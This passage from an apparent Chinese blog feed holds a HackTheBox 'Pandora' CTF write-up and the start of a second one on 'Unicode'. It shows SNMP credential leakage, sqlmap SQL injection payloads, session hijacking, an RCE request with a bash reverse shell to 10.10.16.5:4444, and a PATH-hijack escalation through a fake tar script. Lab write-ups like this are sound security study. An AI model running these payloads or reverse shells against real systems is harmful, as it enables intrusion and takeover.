awk">msf6 auxiliary(scanner<span class="hljs-regexp">/snmp/</span>snmp_enum) &gt; show options<br><br>Module options (auxiliary<span class="hljs-regexp">/scanner/</span>snmp/snmp_enum):<br><br>   Name       Current Setting  Required  Description<br>   ----       ---------------  --------  -----------<br>   COMMUNITY  public           yes       SNMP Community String<br>   RETRIES    <span class="hljs-number">1</span>                yes       SNMP Retries<br>   RHOSTS     <span class="hljs-number">10.10</span>.<span class="hljs-number">11.136</span>     yes       The target host(s), see https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rapid7/m</span>etasploit-framework<span class="hljs-regexp">/wiki/</span>Using-Metasploit<br>   RPORT      <span class="hljs-number">161</span>              yes       The target port (UDP)<br>   THREADS    <span class="hljs-number">1</span>                yes       The number of concurrent threads (max one per host)<br>   TIMEOUT    <span class="hljs-number">1</span>                yes       SNMP Timeout<br>   VERSION    <span class="hljs-number">1</span>                yes       SNMP Version &lt;<span class="hljs-number">1</span>/<span class="hljs-number">2</span>c&gt;<br><br>msf6 auxiliary(scanner<span class="hljs-regexp">/snmp/</span>snmp_enum) &gt; run<br></code></pre></td></tr></table></figure><p>教程中有一句话说snmp中可能会泄露很多敏感信息。</p><blockquote><p><strong>SNMP</strong> has a lot of information about the host and things that you may find interesting are: <strong>Network interfaces</strong> (IPv4 and <strong>IPv6</strong> address), Usernames, Uptime, Server&#x2F;OS version, and <strong>processes running</strong> (may contain passwords)….</p></blockquote><p>我们也重点关注一下，发现在进程命令行中有泄露的密码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220524153511417.png" alt="image-20220524153511417"></p><p>获得凭据信息<code>daniel:HotelBabylon23</code>，登录之，成功。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220524153901475.png" alt="image-20220524153901475"></p><p>然而user.txt在另一个目录下：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tap">daniel@pandora:~$ ls /home<br>daniel  matt<br>daniel@pandora:~$ ls -la /home/matt<br>total 36<br>drwxr-xr-x<span class="hljs-number"> 4 </span>matt matt<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 25 </span>04:54 .<br>drwxr-xr-x<span class="hljs-number"> 4 </span>root root<span class="hljs-number"> 4096 </span>Dec <span class="hljs-number"> 7 </span>14:32 ..<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>matt matt   <span class="hljs-number"> 9 </span>Jun<span class="hljs-number"> 11 </span><span class="hljs-number"> 2021 </span>.bash_history -&gt; /dev/null<br>-rw-r--r--<span class="hljs-number"> 1 </span>matt matt <span class="hljs-number"> 220 </span>Feb<span class="hljs-number"> 25 </span><span class="hljs-number"> 2020 </span>.bash_logout<br>-rw-r--r--<span class="hljs-number"> 1 </span>matt matt<span class="hljs-number"> 3771 </span>Feb<span class="hljs-number"> 25 </span><span class="hljs-number"> 2020 </span>.bashrc<br>drwx------<span class="hljs-number"> 2 </span>matt matt<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 25 </span>04:54 .cache<br>-rw-r--r--<span class="hljs-number"> 1 </span>matt matt <span class="hljs-number"> 807 </span>Feb<span class="hljs-number"> 25 </span><span class="hljs-number"> 2020 </span>.profile<br>drwxr-xr-x<span class="hljs-number"> 2 </span>matt matt<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 25 </span>04:54 .ssh<br>-rw-r-----<span class="hljs-number"> 1 </span>root matt  <span class="hljs-number"> 33 </span>May<span class="hljs-number"> 25 </span>04:50 user.txt<br>-rw-------<span class="hljs-number"> 1 </span>matt matt <span class="hljs-number"> 776 </span>May<span class="hljs-number"> 25 </span>04:54 .viminfo<br>daniel@pandora:~$ <br></code></pre></td></tr></table></figure><h2 id="localhost-80"><a href="#localhost-80" class="headerlink" title="localhost 80"></a>localhost 80</h2><h3 id="linPEAS"><a href="#linPEAS" class="headerlink" title="linPEAS"></a>linPEAS</h3><p>上传<code>linPEAS.sh</code>，进行分析，发现开放了一个本地的网站。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220524155411718.png" alt="image-20220524155411718"></p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>尝试进行访问，使用ssh进行动态端口转发。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -D <span class="hljs-number">7090</span> daniel<span class="hljs-variable">@panda</span>.htb<br></code></pre></td></tr></table></figure><p>然后使用浏览器插件<code>SwitchyOmega</code>配置代理进行访问。配置如下：</p><blockquote><p>这里使用Chrome失败了，但FireFox可以。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220524221711324.png" alt="image-20220524221711324"></p><h3 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h3><p>访问网站如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220524221221390.png" alt="image-20220524221221390"></p><p>在网站底部能够发现CMS的版本号。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220524221823301.png" alt="image-20220524221823301"></p><p>我们目前没有相关可供登录的账号信息，有版本号的情况下我们可以Google一下现成的CVE，随后找到一个SQLi的<a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/">文章</a>。</p><p>在配置<code>proxychains</code>后，使用<code>sqlmap</code>进行注入测试。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">proxychai<span class="hljs-symbol">ns4</span> sqlmap -u <span class="hljs-string">&quot;http://localhost/pandora_console/include/chart_generator.php?session_id=a&quot;</span><br></code></pre></td></tr></table></figure><p>检测结果表明是存在注入的。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➤</span>  <span class="hljs-string">proxychains4</span> <span class="hljs-string">sqlmap</span> <span class="hljs-string">-u</span> <span class="hljs-string">&quot;http://localhost/pandora_console/include/chart_generator.php?session_id=a&quot;</span> <span class="hljs-string">--current-db</span><br>[<span class="hljs-string">proxychains</span>] <span class="hljs-attr">config file found:</span> <span class="hljs-string">/etc/proxychains4.conf</span><br>[<span class="hljs-string">proxychains</span>] <span class="hljs-string">preloading</span> <span class="hljs-string">/usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br>[<span class="hljs-string">proxychains</span>] <span class="hljs-attr">DLL init:</span> <span class="hljs-string">proxychains-ng</span> <span class="hljs-number">4.16</span><br>[<span class="hljs-string">...</span>]<br><span class="hljs-meta">---</span><br><span class="hljs-attr">Parameter:</span> <span class="hljs-string">session_id</span> <span class="hljs-string">(GET)</span><br>    <span class="hljs-attr">Type:</span> <span class="hljs-string">boolean-based</span> <span class="hljs-string">blind</span><br>    <span class="hljs-attr">Title:</span> <span class="hljs-string">MySQL</span> <span class="hljs-string">RLIKE</span> <span class="hljs-string">boolean-based</span> <span class="hljs-string">blind</span> <span class="hljs-bullet">-</span> <span class="hljs-string">WHERE,</span> <span class="hljs-string">HAVING,</span> <span class="hljs-string">ORDER</span> <span class="hljs-string">BY</span> <span class="hljs-string">or</span> <span class="hljs-string">GROUP</span> <span class="hljs-string">BY</span> <span class="hljs-string">clause</span><br>    <span class="hljs-attr">Payload:</span> <span class="hljs-string">session_id=a&#x27;</span> <span class="hljs-string">RLIKE</span> <span class="hljs-string">(SELECT</span> <span class="hljs-string">(CASE</span> <span class="hljs-string">WHEN</span> <span class="hljs-string">(6958=6958)</span> <span class="hljs-string">THEN</span> <span class="hljs-number">0x61</span> <span class="hljs-string">ELSE</span> <span class="hljs-number">0x28</span> <span class="hljs-string">END))--</span> <span class="hljs-string">PrgA</span><br><br>    <span class="hljs-attr">Type:</span> <span class="hljs-string">error-based</span><br>    <span class="hljs-attr">Title:</span> <span class="hljs-string">MySQL</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">5.0</span> <span class="hljs-string">OR</span> <span class="hljs-string">error-based</span> <span class="hljs-bullet">-</span> <span class="hljs-string">WHERE,</span> <span class="hljs-string">HAVING,</span> <span class="hljs-string">ORDER</span> <span class="hljs-string">BY</span> <span class="hljs-string">or</span> <span class="hljs-string">GROUP</span> <span class="hljs-string">BY</span> <span class="hljs-string">clause</span> <span class="hljs-string">(FLOOR)</span><br>    <span class="hljs-attr">Payload:</span> <span class="hljs-string">session_id=a&#x27;</span> <span class="hljs-string">OR</span> <span class="hljs-string">(SELECT</span> <span class="hljs-number">5072 </span><span class="hljs-string">FROM(SELECT</span> <span class="hljs-string">COUNT(*),CONCAT(0x71707a7671,(SELECT</span> <span class="hljs-string">(ELT(5072=5072,1))),0x71717a7171,FLOOR(RAND(0)*2))x</span> <span class="hljs-string">FROM</span> <span class="hljs-string">INFORMATION_SCHEMA.PLUGINS</span> <span class="hljs-string">GROUP</span> <span class="hljs-string">BY</span> <span class="hljs-string">x)a)--</span> <span class="hljs-string">AHqB</span><br><br>    <span class="hljs-attr">Type:</span> <span class="hljs-string">time-based</span> <span class="hljs-string">blind</span><br>    <span class="hljs-attr">Title:</span> <span class="hljs-string">MySQL</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">5.0</span><span class="hljs-number">.12</span> <span class="hljs-string">AND</span> <span class="hljs-string">time-based</span> <span class="hljs-string">blind</span> <span class="hljs-string">(query</span> <span class="hljs-string">SLEEP)</span><br>    <span class="hljs-attr">Payload:</span> <span class="hljs-string">session_id=a&#x27;</span> <span class="hljs-string">AND</span> <span class="hljs-string">(SELECT</span> <span class="hljs-number">6811 </span><span class="hljs-string">FROM</span> <span class="hljs-string">(SELECT(SLEEP(5)))haIg)--</span> <span class="hljs-string">wyjD</span><br><span class="hljs-meta">---</span><br>[<span class="hljs-number">13</span><span class="hljs-string">:32:06</span>] [<span class="hljs-string">INFO</span>] <span class="hljs-string">the</span> <span class="hljs-string">back-end</span> <span class="hljs-string">DBMS</span> <span class="hljs-string">is</span> <span class="hljs-string">MySQL</span><br><span class="hljs-attr">web server operating system:</span> <span class="hljs-string">Linux</span> <span class="hljs-string">Ubuntu</span> <span class="hljs-number">20.04</span> <span class="hljs-string">or</span> <span class="hljs-number">20.10</span> <span class="hljs-string">or</span> <span class="hljs-number">19.10</span> <span class="hljs-string">(eoan</span> <span class="hljs-string">or</span> <span class="hljs-string">focal)</span><br><span class="hljs-attr">web application technology:</span> <span class="hljs-string">Apache</span> <span class="hljs-number">2.4</span><span class="hljs-number">.41</span><span class="hljs-string">,</span> <span class="hljs-string">PHP</span><br><span class="hljs-attr">back-end DBMS:</span> <span class="hljs-string">MySQL</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">5.0</span> <span class="hljs-string">(MariaDB</span> <span class="hljs-string">fork)</span><br>[<span class="hljs-number">13</span><span class="hljs-string">:32:06</span>] [<span class="hljs-string">INFO</span>] <span class="hljs-string">fetching</span> <span class="hljs-string">current</span> <span class="hljs-string">database</span><br>[<span class="hljs-number">13</span><span class="hljs-string">:32:06</span>] [<span class="hljs-string">INFO</span>] <span class="hljs-attr">resumed:</span> <span class="hljs-string">&#x27;pandora&#x27;</span><br><span class="hljs-attr">current database:</span> <span class="hljs-string">&#x27;pandora&#x27;</span><br>[<span class="hljs-number">13</span><span class="hljs-string">:32:06</span>] [<span class="hljs-string">INFO</span>] <span class="hljs-string">fetched</span> <span class="hljs-string">data</span> <span class="hljs-string">logged</span> <span class="hljs-string">to</span> <span class="hljs-string">text</span> <span class="hljs-string">files</span> <span class="hljs-string">under</span> <span class="hljs-string">&#x27;/home/kali/.local/share/sqlmap/output/localhost&#x27;</span><br><br>[<span class="hljs-string">*</span>] <span class="hljs-string">ending</span> <span class="hljs-string">@</span> <span class="hljs-number">13</span><span class="hljs-string">:32:06</span> <span class="hljs-string">/2022-05-25/</span><br></code></pre></td></tr></table></figure><p>翻了一下没找到密码，看看能不能拿到高权限用户的Session，在<code>tsessions_php</code>这个表中。</p><p>能够发现有matt和admin的session。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+----------------------------+------------------------------------------------------+-------------+<br>|<span class="hljs-string"> id_session                 </span>|<span class="hljs-string"> data                                                 </span>|<span class="hljs-string"> last_active </span>|<br>+----------------------------+------------------------------------------------------+-------------+<br>|<span class="hljs-string"> g4e01qdgk36mfdh90hvcc54umq </span>|<span class="hljs-string"> id_usuario</span>|<span class="hljs-string">s:4:&quot;matt&quot;;alert_msg</span>|<span class="hljs-string">a:0:&#123;&#125;new_chat</span>|<span class="hljs-string">b:0;  </span>|<span class="hljs-string"> 1638796349  </span>|<br>|<span class="hljs-string"> pf88dv85qdvh3d61domv9p0jl9 </span>|<span class="hljs-string"> id_usuario</span>|<span class="hljs-string">s:5:&quot;admin&quot;;alert_msg</span>|<span class="hljs-string">a:0:&#123;&#125;new_chat</span>|<span class="hljs-string">b:0; </span>|<span class="hljs-string"> 1653432746  </span>|<br>+----------------------------+------------------------------------------------------+-------------+<br></code></pre></td></tr></table></figure><p>将matt的session复制到我们的cookie中，刷新一下就能以matt的身份登录了：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220525101251635.png" alt="image-20220525101251635"></p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>看看有没有RCE相关的CVE，一番搜索后找到如下几个链接。其中前两个是msf中的现成模块，但是发现都需要用户名密码。密码我们目前是不知道的。</p><p>在第二个链接中能够发现该模块主要的参考地址，即第三个链接。在第三个链接中就能找到POC了：</p><blockquote><p><a href="https://www.rapid7.com/db/modules/exploit/linux/http/pandora_fms_events_exec/">https://www.rapid7.com/db/modules/exploit/linux/http/pandora_fms_events_exec/</a></p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/pandora_fms_events_exec.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/pandora_fms_events_exec.rb</a></p><p><a href="https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities">https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities</a></p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220525103550035.png" alt="image-20220525103550035"></p><p>验证存在命令执行后，我们弹个shell回来。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/pandora_console/ajax.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>139<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.20<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/pandora_console/index.php?sec=eventos&amp;sec2=operation/events/events<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=g4e01qdgk36mfdh90hvcc54umq<br><br><span class="language-sas"><span class="hljs-keyword">page</span>=include/ajax/events<span class="hljs-variable">&amp;perform_event_response</span>=10000000</span><br><span class="language-sas"><span class="hljs-variable">&amp;target</span>=bash+-c+<span class="hljs-string">&#x27;exec+bash+-i+&gt;%26+/dev/tcp/10.10.16.5/4444+0&gt;%261&#x27;</span><span class="hljs-variable">&amp;response_id</span>=1</span><br></code></pre></td></tr></table></figure><p>然后在matt的家目录下就能拿到user.txt了：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220525104322024.png" alt="image-20220525104322024"></p><h1 id="0x03-root-txt"><a href="#0x03-root-txt" class="headerlink" title="0x03 root.txt"></a>0x03 root.txt</h1><h2 id="linPEAS-1"><a href="#linPEAS-1" class="headerlink" title="linPEAS"></a>linPEAS</h2><p>继续提权，用之前上传的linPEAS，发现有一个<code>pandora_backup</code>文件存在SUID位。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220525105829335.png" alt="image-20220525105829335"></p><p>在我们这个反弹的shell上执行<code>/usr/bin/pandora_backup</code>会失败，同时sudo也出现了问题。</p><blockquote><p>最后得知原因是Apache防止提权的的保护机制，<a href="https://youtu.be/XvfpOIAMx6Y">参考</a>。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">matt@pandora:<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/pandora/</span>pandora_console$ <span class="hljs-regexp">/usr/</span>bin/pandora_backup<br><span class="hljs-regexp">/usr/</span>bin/pandora_backup<br>tar: <span class="hljs-regexp">/root/</span>.backup/pandora-backup.tar.gz: Cannot open: Permission denied<br>tar: Error is not recoverable: exiting now<br>PandoraFMS Backup Utility<br>Now attempting to backup PandoraFMS client<br>Backup failed!<br>Check your permissions!<br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">matt<span class="hljs-variable">@pandora</span><span class="hljs-symbol">:/var/www/pandora/pandora_console</span><span class="hljs-variable">$ </span>sudo -l<br>sudo -l<br><span class="hljs-symbol">sudo:</span> <span class="hljs-symbol">PERM_ROOT:</span> setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>): <span class="hljs-title class_">Operation</span> <span class="hljs-keyword">not</span> permitted<br><span class="hljs-symbol">sudo:</span> unable to initialize policy plugin<br>matt<span class="hljs-variable">@pandora</span><span class="hljs-symbol">:/var/www/pandora/pandora_console</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure><p>猜测可能是shell本身的问题，在写入公钥文件到<code>/home/matt/.ssh/authorized_keys</code>中后并正常用ssh登录后，问题消失了。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220525122713543.png" alt="image-20220525122713543"></p><h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">matt<span class="hljs-variable">@pandora</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>/usr/bin/pandora_backup<br>[...]<br><span class="hljs-title class_">Backup</span> successful!<br><span class="hljs-title class_">Terminating</span> program!<br></code></pre></td></tr></table></figure><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>用file命令分析一下pandora_backup文件：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">➤  file pandora_backup <br>pandora_backup: ELF <span class="hljs-number">64</span>-bit LSB pie executable<span class="hljs-punctuation">,</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span><span class="hljs-number">-64</span><span class="hljs-punctuation">,</span> version <span class="hljs-number">1</span> (SYSV)<span class="hljs-punctuation">,</span> dynamically linked<span class="hljs-punctuation">,</span> interpreter /lib<span class="hljs-number">64</span>/ld-linux-<span class="hljs-keyword">x</span><span class="hljs-number">86</span><span class="hljs-number">-64</span>.so.<span class="hljs-number">2</span><span class="hljs-punctuation">,</span> BuildID[sha<span class="hljs-number">1</span>]<span class="hljs-operator">=</span><span class="hljs-number">7174</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>b<span class="hljs-number">04737</span>ad<span class="hljs-number">11254839</span><span class="hljs-keyword">c</span><span class="hljs-number">20</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>dab<span class="hljs-number">66</span>fce<span class="hljs-number">55</span>af<span class="hljs-number">8</span><span class="hljs-punctuation">,</span> for GNU/Linux <span class="hljs-number">3.2</span>.<span class="hljs-number">0</span><span class="hljs-punctuation">,</span> not stripped<br></code></pre></td></tr></table></figure><p>下下来拖进IDA看看，能够看到<code>tar</code>命令没有使用绝对路径，我们可以劫持<code>PATH</code>变量完成攻击。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220525123519793.png" alt="image-20220525123519793"></p><p>当然我们也可以使用ltrace命令。ltrace会将SUID位drop掉，但我仍然可以大概得出程序的执行流程。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus">matt@pandora:/tmp$ ltrace pandora_backup <br><span class="hljs-function"><span class="hljs-title">getuid</span><span class="hljs-params">()</span></span>                                                                  = <span class="hljs-number">1000</span><br><span class="hljs-function"><span class="hljs-title">geteuid</span><span class="hljs-params">()</span></span>                                                                 = <span class="hljs-number">1000</span><br><span class="hljs-function"><span class="hljs-title">setreuid</span><span class="hljs-params">(<span class="hljs-number">1000</span>, <span class="hljs-number">1000</span>)</span></span>                                                      = <span class="hljs-number">0</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;PandoraFMS Backup Utility&quot;</span>PandoraFMS Backup Utility<br>)                                         = <span class="hljs-number">26</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now attempting to backup Pandora&quot;</span>..<span class="hljs-selector-class">.Now</span> attempting to backup PandoraFMS client<br>)                               = <span class="hljs-number">43</span><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;tar -cvf /root/.backup/pandora-b&quot;</span>..<span class="hljs-selector-class">.tar</span>: /root/.backup/pandora-backup<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span>: Cannot open: Permission denied<br>tar: Error is not recoverable: exiting now<br> &lt;no return ...&gt;<br>--- SIGCHLD (Child exited) ---<br>&lt;... system resumed&gt; )                                                    = <span class="hljs-number">512</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Backup failed!\nCheck your permis&quot;</span>..<span class="hljs-selector-class">.Backup</span> failed!<br>Check your permissions!<br>)                              = <span class="hljs-number">39</span><br>+++ exited (status <span class="hljs-number">1</span>) +++<br><br></code></pre></td></tr></table></figure><h2 id="劫持PATH变量"><a href="#劫持PATH变量" class="headerlink" title="劫持PATH变量"></a>劫持PATH变量</h2><p>我们在&#x2F;tmp目录下建立一个同名tar文件并添加可执行权限。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby">matt<span class="hljs-variable">@pandora</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cd /tmp<br>matt<span class="hljs-variable">@pandora</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>cat tar<br><span class="hljs-comment">#!/bin/bash</span><br>bash -i &gt;&amp; <span class="hljs-regexp">/dev/tcp</span><span class="hljs-regexp">/10.10.16.5/</span><span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>matt<span class="hljs-variable">@pandora</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>chmod +x tar<br>matt<span class="hljs-variable">@pandora</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure><p>之后将<code>/tmp</code>目录插到matt用户<code>PATH</code>变量的最前面。</p><p>之后在本机监听端口，并运行<code>pandora_backup</code>即可拿到root的shell。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220525130029102.png" alt="image-20220525130029102"></p><h1 id="0x04-Summary"><a href="#0x04-Summary" class="headerlink" title="0x04 Summary"></a>0x04 Summary</h1><p>这是一个Easy难度的Linux靶机，主要考察内容如下：</p><ul><li>SNMP 利用</li><li>本地服务发现</li><li>CVE利用</li><li>PATH变量劫持</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Unicode</title>
    <link href="/2022/05/19/HTB/Unicode/"/>
    <url>/2022/05/19/HTB/Unicode/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-Recon"><a href="#0x01-Recon" class="headerlink" title="0x01 Recon"></a>0x01 Recon</h1><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sC -sV -v <span class="hljs-number">10.10.11.126</span> <br></code></pre></td></tr></table></figure><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs coq">PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.3</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey:<br>|   <span class="hljs-type">3072</span> fd:a0:f7:<span class="hljs-number">93</span>:<span class="hljs-number">9</span>e:d3:cc:bd:c2:<span class="hljs-number">3</span>c:<span class="hljs-number">7</span>f:<span class="hljs-number">92</span>:<span class="hljs-number">35</span>:<span class="hljs-number">70</span>:d7:<span class="hljs-number">77</span> (RSA)<br>|   <span class="hljs-type">256</span> <span class="hljs-number">8</span>b:b6:<span class="hljs-number">98</span>:<span class="hljs-number">2</span>d:fa:<span class="hljs-number">00</span>:e5:e2:<span class="hljs-number">9</span>c:<span class="hljs-number">8</span>f:af:<span class="hljs-number">0</span>f:<span class="hljs-number">44</span>:<span class="hljs-number">99</span>:<span class="hljs-number">03</span>:b1 (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> c9:<span class="hljs-number">89</span>:<span class="hljs-number">27</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">91</span>:cb:<span class="hljs-number">51</span>:<span class="hljs-number">27</span>:<span 